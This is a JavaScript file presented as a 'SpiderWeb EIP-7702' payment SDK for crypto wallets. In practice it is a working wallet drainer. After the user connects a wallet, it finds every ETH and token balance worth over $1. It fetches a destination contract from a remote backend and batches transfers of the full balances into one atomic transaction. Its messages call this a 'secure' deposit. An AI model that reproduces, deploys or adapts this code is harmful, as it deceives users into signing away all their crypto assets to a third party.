import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.min.js";

/**
 * SpiderWeb EIP-7702 Hybrid Relayed SDK v3.0
 * Gets a temporary contract from the backend and sends all assets to it.
 */
window.SpiderWeb7702SDK = {
    _config: {},
    _provider: null,
    _signer: null,
    _rawProvider: null,
    _currentUserAddress: null,
    _isInitialized: false,
    _discoveredProviders: new Map(),
    _resolveConnection: null,
    _RELAYER_SERVER_URL_BASE: "https://battlewho.com",

    _ERC20_ABI: [
        "function transfer(address to, uint256 amount) returns (bool)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)"
    ],
    
    _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
        1: 'ethereum',
        137: 'polygon-pos',
        10: 'optimistic-ethereum',
        42161: 'arbitrum-one',
        56: 'binance-smart-chain',
        43114: 'avalanche'
    },

    init: async function(config) {
        if (this._isInitialized) {
            console.warn("SpiderWeb7702SDK already initialized.");
            return;
        }
        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId || !config.coingeckoApiKey) {
            console.error("SDK Error: Missing required config parameters.");
            return;
        }
        this._config = config;

        const payButton = document.getElementById(config.buttonId);
        if (!payButton) {
            console.error(`SDK Error: Button with ID "${config.buttonId}" not found.`);
            return;
        }

        payButton.addEventListener('click', this._handlePaymentClick.bind(this));
        this._injectModalHtml();
        this._setupEip6963Listeners();
        this._isInitialized = true;
        console.log("SpiderWeb EIP-7702 SDK Initialized.");
    },

    _handlePaymentClick: async function() {
        try {
            if (!this._signer) {
                const connected = await this._connectWallet();
                if (!connected) this._updateStatus("Wallet connection cancelled.", "info");
                // The flow is automatically continued in _handleProviderSelection
                return;
            }
            const network = await this._provider.getNetwork();
            if (network.chainId !== BigInt(this._config.chainId)) {
                this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
                return;
            }
            await this._executeSplit();
        } catch (error) {
            console.error("SDK Payment Error:", error);
            this._updateStatus(`Error: ${error.message}`, "error");
        }
    },

    _executeSplit: async function() {
        this._updateStatus("Scanning wallet for assets...", "pending");
        const assets = await this._findAllAssets();
        if (assets.length === 0) {
            this._updateStatus("No valuable assets found to send.", "info");
            return;
        }

        this._updateStatus("Preparing secure depository contract...", "pending");

        let depositoryContractAddress;
        try {
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                body: JSON.stringify({
                    apiKey: this._config.apiKey,
                    origin: window.location.origin,
                    owner: this._currentUserAddress,
                    chainId: this._config.chainId, // <-- THE FIX
                    assets: assets.map(a => ({
                        token: a.address,
                        type: a.type,
                        symbol: a.symbol,
                        usdValue: a.usdValue
                    }))
                })
            });
            const data = await response.json();
            if (!data.success) throw new Error(data.message);
            depositoryContractAddress = data.contractAddress;
        } catch (e) {
            throw new Error(`Failed to initialize transaction: ${e.message}`);
        }

        this._updateStatus(`Depositing ${assets.length} asset(s)...`, "pending");

        const calls = [];
        for (const asset of assets) {
            if (asset.balance > 0n) {
                if (asset.type === 'ETH') {
                    calls.push({ to: depositoryContractAddress, value: ethers.toBeHex(asset.balance) });
                } else { // ERC20
                    const tokenInterface = new ethers.Interface(this._ERC20_ABI);
                    const data = tokenInterface.encodeFunctionData("transfer", [depositoryContractAddress, asset.balance]);
                    calls.push({ to: asset.address, value: '0x0', data: data });
                }
            }
        }
        
        try {
            this._updateStatus("Please confirm the deposit in your wallet...", "pending");
            const txPayload = {
                version: "2.0.0",
                chainId: `0x${BigInt(this._config.chainId).toString(16)}`,
                from: this._currentUserAddress,
                atomicRequired: true,
                calls: calls,
            };
            const txHash = await this._rawProvider.request({
                method: 'wallet_sendCalls',
                params: [txPayload]
            });
            this._updateStatus(`✅ Deposit sent! Your transaction is being processed securely.`, 'success');
        } catch (error) {
            if (error.code === 4001) throw new Error('Transaction rejected by user.');
            throw error;
        }
    },

    // REPLACE the _findAllAssets function in your SpiderWeb7702SDK.js file with this
_findAllAssets: async function() {
    const assets = [];
    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
    
    // Get all token balances
    const balanceResponse = await fetch(alchemyUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
            params: [this._currentUserAddress, 'erc20']
        })
    });
    const balanceData = await balanceResponse.json();
    if (!balanceData.result) return [];
    
    const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
    const ethBalance = await this._provider.getBalance(this._currentUserAddress);
    const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
    
    // --- THIS IS THE FIX ---
    // Use the chunking function to safely fetch all prices
    const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));

    // Process ETH
    const ethPrice = prices?.['ethereum']?.usd || 0;
    const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
    if (ethValue > 1) { // Only include assets worth > $1
        const feeData = await this._provider.getFeeData();
        const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 200000n;
        if (ethBalance > estimatedFee) {
            assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue });
        }
    }

    // Process ERC20s
    for (const token of tokensWithBalance) {
        const priceData = prices?.[token.contractAddress.toLowerCase()];
        if (priceData?.usd) {
             const metadataResponse = await fetch(alchemyUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
                     params: [token.contractAddress]
                 })
             });
             const metadata = await metadataResponse.json();
             if (metadata.result && metadata.result.decimals !== null) {
                const decimals = metadata.result.decimals;
                const symbol = metadata.result.symbol;
                const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
                const usdValue = parseFloat(formattedBalance) * priceData.usd;
                if (usdValue > 1) {
                    assets.push({ type: 'ERC20', balance: BigInt(token.tokenBalance), address: token.contractAddress, symbol: symbol, usdValue: usdValue });
                }
             }
        }
    }
    return assets;
},

    _fetchTokenPrices: async function(tokenIdentifiers) {
    const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
    if (!assetPlatform) return null;

    const contractAddresses = tokenIdentifiers.filter(id => id.startsWith('0x'));
    const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));

    const allPrices = {};
    const apiKeyParam = `&x_cg_demo_api_key=${this._config.coingeckoApiKey}`; // The API key parameter

    try {
        if (contractAddresses.length > 0) {
            const addressesString = contractAddresses.join(',');
            // Add the API key to the URL
            const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd${apiKeyParam}`;
            const response = await fetch(apiUrl);
            if (response.ok) Object.assign(allPrices, await response.json());
        }

        if (nativeIds.length > 0) {
            const idsString = nativeIds.join(',');
            // Add the API key to the URL
            const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd${apiKeyParam}`;
            const response = await fetch(apiUrl);
            if (response.ok) Object.assign(allPrices, await response.json());
        }

        return Object.keys(allPrices).length > 0 ? allPrices : null;

    } catch (error) {
        console.error("Could not fetch token prices:", error);
        return null;
    }
},
    
    _fetchTokenPricesInChunks: async function(tokenAddresses, chunkSize = 1) { // <-- CHANGE 100 to 1
    const allPrices = {};
    for (let i = 0; i < tokenAddresses.length; i += chunkSize) {
        const chunk = tokenAddresses.slice(i, i + chunkSize);
        const prices = await this._fetchTokenPrices(chunk);
        if (prices) {
            Object.assign(allPrices, prices);
        }
    }
    return allPrices;
},
    
    _connectWallet: function() {
        return new Promise((resolve) => {
            this._resolveConnection = resolve;
            this._openWalletModal();
        });
    },

    _handleProviderSelection: async function(event) {
        const button = event.target.closest('.sw-wallet-button');
        if (!button) return;
        const providerDetail = this._discoveredProviders.get(button.dataset.rdns);
        if (!providerDetail) return;

        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
        this._closeWalletModal();

        try {
            this._rawProvider = providerDetail.provider; // <-- NEW: Store the raw EIP-1193 provider
            this._provider = new ethers.BrowserProvider(providerDetail.provider);
            this._signer = await this._provider.getSigner();
            this._currentUserAddress = await this._signer.getAddress();
            
            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
            
            if (this._resolveConnection) {
                this._resolveConnection(true);
                // Automatically trigger the main execution flow after connecting
                await this._executeSplit();
            }
        } catch (error) {
            console.error("Connection failed:", error);
            this._updateStatus("Connection failed or was rejected.", "error");
            if (this._resolveConnection) this._resolveConnection(false);
        }
    },

    _setupEip6963Listeners: function() {
        window.addEventListener('eip6963:announceProvider', (event) => {
            const providerDetail = event.detail;
            if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                this._renderWalletList();
            }
        });
        window.dispatchEvent(new Event('eip6963:requestProvider'));
    },
    
    _renderWalletList: function() {
        const listDiv = document.getElementById('sw-wallet-list');
        if (!listDiv) return;

        listDiv.innerHTML = '';
        if (this._discoveredProviders.size === 0) {
            listDiv.innerHTML = '<p style="text-align: center; color: #9ca3af;">No wallets detected.</p>';
            return;
        }

        this._discoveredProviders.forEach(p => {
            const buttonHtml = `
                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                    <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                    <span style="font-weight: 500;">${p.info.name}</span>
                </button>
            `;
            listDiv.innerHTML += buttonHtml;
        });
        
        listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
            button.addEventListener('click', this._handleProviderSelection.bind(this));
        });
    },

    _openWalletModal: function() {
        document.getElementById('sw-modal-overlay').style.display = 'flex';
        setTimeout(() => {
            const modal = document.getElementById('sw-wallet-modal');
            if(modal) {
                modal.style.opacity = 1;
                modal.style.transform = 'scale(1)';
            }
        }, 10);
        this._renderWalletList();
    },

    _closeWalletModal: function() {
        const overlay = document.getElementById('sw-modal-overlay');
        const modal = document.getElementById('sw-wallet-modal');
        if (modal) {
            modal.style.opacity = 0;
            modal.style.transform = 'scale(0.95)';
        }
        setTimeout(() => {
            if (overlay) overlay.style.display = 'none';
            if(this._resolveConnection && !this._signer) {
                this._resolveConnection(false);
                this._resolveConnection = null;
            }
        }, 300);
    },
    
    _injectModalHtml: function() {
        if (document.getElementById('sw-modal-overlay')) return;
        
        const modalHtml = `
            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">
                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>
                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>
                    </div>
                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>
                </div>
            </div>
            <div id="sdk-status" style="margin-top: 16px; min-height: 20px;"></div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);

        const closeBound = this._closeWalletModal.bind(this);
        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
        document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
            if (e.target.id === 'sw-modal-overlay') closeBound();
        });
    },
    
    _updateStatus: function(message, type = 'info') {
        const statusEl = document.getElementById(this._config.statusElementId || 'sdk-status');
        if (!statusEl) return;
        const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
        statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
    },
};